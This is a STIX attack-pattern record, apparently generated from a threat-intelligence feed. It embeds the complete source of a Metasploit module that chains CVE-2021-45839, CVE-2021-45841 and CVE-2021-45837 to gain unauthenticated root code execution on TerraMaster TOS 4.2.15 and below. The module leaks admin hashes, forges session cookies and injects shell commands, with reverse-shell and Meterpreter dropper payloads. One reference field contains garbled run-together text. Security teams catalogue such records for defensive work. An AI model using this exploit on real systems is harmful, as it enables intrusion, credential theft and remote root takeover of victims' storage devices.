{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9017ea3-d1a0-4d25-ae1d-82cc1e5ca063",
    "created": "2024-08-14T17:03:05.277331Z",
    "modified": "2024-08-14T17:03:05.277336Z",
    "name": "TerraMaster TOS 4.2.15 or lower - RCE chain from unauthenticated to root via session crafting.",
    "description": " Terramaster chained exploit that performs session crafting to achieve escalated privileges that allows an attacker to access vulnerable code execution flaws. TOS versions 4.2.15 and below are affected.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/terramaster_unauth_rce_cve_2021_45837.rb",
            "external_id": "terramaster_unauth_rce_cve_2021_45837.rb"
        },
        {
            "source_name": "Finally",
            "external_id": "CVE-2021-45837isexploitedtoexecutearbitrarycommandsasrootbysendingaspecificallycrafted"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-45837"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-45839"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-45841"
        },
        {
            "source_name": "reference",
            "url": "https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest/md5'\nrequire 'time'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TerraMaster TOS 4.2.15 or lower - RCE chain from unauthenticated to root via session crafting.',\n        'Description' => %q{\n          Terramaster chained exploit that performs session crafting to achieve escalated privileges that allows\n          an attacker to access vulnerable code execution flaws. TOS versions 4.2.15 and below are affected.\n          CVE-2021-45839 is exploited to obtain the first administrator's hash set up on the system as well as other\n          information such as MAC address, by performing a request to the `/module/api.php?mobile/webNasIPS` endpoint.\n          This information is used to craft an unauthenticated admin session using CVE-2021-45841 where an attacker\n          can self-sign session cookies by knowing the target MAC address and the user password hash.\n          Guest users (disabled by default) can be abused using a null/empty hash and allow an unauthenticated attacker\n          to login as guest.\n          Finally, CVE-2021-45837 is exploited to execute arbitrary commands as root by sending a specifically crafted\n          input to vulnerable endpoint `/tos/index.php?app/del`.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'n0tme' # Discovery and POC\n        ],\n        'References' => [\n          ['CVE', '2021-45837'],\n          ['CVE', '2021-45839'],\n          ['CVE', '2021-45841'],\n          ['URL', 'https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/'],\n          ['PACKETSTORM', '165399'],\n          ['URL', 'https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837']\n        ],\n        'DisclosureDate' => '2021-12-24',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['bourne', 'wget', 'curl'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8181,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/'])\n    ])\n  end\n\n  def get_data\n    # Initialise instance variable data to store the leaked data\n    @data = {}\n\n    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`.\n    # CVE-2021-458439\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/webNasIPS'),\n      'headers' => {\n        'User-Agent' => 'TNAS',\n        'User-Device' => 'TNAS'\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?('webNasIPS successful')\n      # Parse the JSON response and get the data such as admin password hash and MAC address\n      res_json = res.get_json_document\n      unless res_json.blank?\n        @data['password'] = res_json['data'].split('PWD:')[1].split(\"\\n\")[0].strip\n        @data['mac'] = res_json['data'].split('mac\":\"')[1].split('\"')[0].tr(':', '').strip\n        @data['key'] = @data['mac'][6..11] # last three MAC address entries\n        @data['timestamp'] = Time.new.to_i.to_s\n        # derive signature\n        @data['signature'] = tos_encrypt_str(@data['key'], @data['timestamp'])\n      end\n    end\n  end\n\n  def tos_encrypt_str(key, str_to_encrypt)\n    id = key + str_to_encrypt\n    return Digest::MD5.hexdigest(id.encode('utf-8'))\n  end\n\n  def get_headers\n    {\n      'User-Agent' => 'TNAS',\n      'User-Device' => 'TNAS',\n      'Authorization' => @data['password'],\n      'Signature' => @data['signature'],\n      'Timestamp' => @data['timestamp']\n    }\n  end\n\n  def download_admin_users\n    # Initialise instance variable admin_users to store the admin users from /etc/group\n    @admin_users = []\n\n    # Download /etc/group information to find all the admin users belonging to the group admin.\n    # Using endpoint module/api.php?mobile/fileDownload as user guest allows to download the file without authentication.\n    # CVE-2021-45841\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/fileDownload'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'cookie' => \"kod_name=guest; kod_token=#{tos_encrypt_str(@data['key'], '')}\",\n      'headers' => get_headers,\n      'vars_post' => {\n        'path' => '/etc/group'\n      }\n    })\n    # get the admin users from /etc/group\n    if res && res.code == 200 && res.body.include?('admin')\n      res.body.each_line do |line|\n        next if line.empty?\n\n        field = line.split(':')\n        next unless field[0] == 'admin'\n\n        @admin_users = field[3].strip.split(',')\n        break\n      end\n    end\n  end\n\n  def get_session\n    # Use session crafting to iterate thru the list of admin users to gain a session.\n    # We will send two request per admin user. First request is a dummy request to obtain the session-id.\n    # This session-id will be used to send the second request that will execute the echo command with marker.\n    # if the response contains the marker, then the session has been successfully established.\n    # CVE-2021-45837\n    session = false\n    marker = Rex::Text.rand_text_alphanumeric(8..16)\n    for admin in @admin_users\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'tos', \"index.php?app/del&id=0&name=;echo${IFS}#{marker};%23\"),\n        'ctype' => 'application/x-www-form-urlencoded',\n        'keep_cookies' => true,\n        'cookie' => \"kod_name=#{admin}; kod_token=#{tos_encrypt_str(@data['key'], @data['password'])}\",\n        'headers' => get_headers\n      })\n      if res && res.code == 302 && !res.body.include?(marker.to_s)\n        # Send second request to establish a session and break from the loop if true.\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(target_uri.path, 'tos', \"index.php?app/del&id=0&name=;echo${IFS}#{marker};%23\"),\n          'ctype' => 'application/x-www-form-urlencoded',\n          'keep_cookies' => true,\n          'headers' => get_headers\n        })\n      end\n      next unless res && res.code == 200 && res.body.include?(marker.to_s)\n\n      session = true\n      break\n    end\n    session\n  end\n\n  def get_terramaster_info\n    # get Terramaster CPU architecture (X64 or ARM64) and TOS version\n    @terramaster = {}\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')\n    })\n\n    if res && res.body && res.code == 200\n      # get the version information from the request response like below:\n      # <link href=\"./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07\" rel=\"stylesheet\"/>\n      return if res.body.match(/ver=.+?\"/).nil?\n\n      version = res.body.match(/ver=.+?\"/)[0]\n      # check if architecture is ARM64 or X64\n      if version.match(/_A/)\n        @terramaster['cpu_arch'] = 'ARM64'\n      elsif version.match(/_S/) || version.match(/_Q/)\n        @terramaster['cpu_arch'] = 'X64'\n      else\n        @terramaster['cpu_arch'] = 'UNKNOWN'\n      end\n\n      # strip TOS version number and remove trailing double quote.\n      @terramaster['tos_version'] = version.split('.0_')[1].chop\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Execute payload using vulnerable endpoint `index.php?app/del&id=0&name=;<PAYLOAD>;%23`\n    # CVE-2021-45837\n    payload = CGI.escape(cmd)\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'tos', \"index.php?app/del&id=0&name=;#{payload};%23\"),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'headers' => get_headers\n    })\n  end\n\n  def check\n    get_terramaster_info\n    return CheckCode::Safe if @terramaster.empty?\n\n    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.15')\n      return CheckCode::Vulnerable(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n    end\n\n    CheckCode::Safe(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n  end\n\n  def exploit\n    # get the leaked data\n    get_data\n    fail_with(Failure::BadConfig, 'Can not retrieve the leaked data.') if @data.empty?\n\n    download_admin_users\n    fail_with(Failure::BadConfig, 'Can not retrieve the list of admin users.') if @admin_users.empty?\n\n    fail_with(Failure::NoAccess, 'Can not establish an admin session.') unless get_session\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager(linemax: 65536)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-12-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}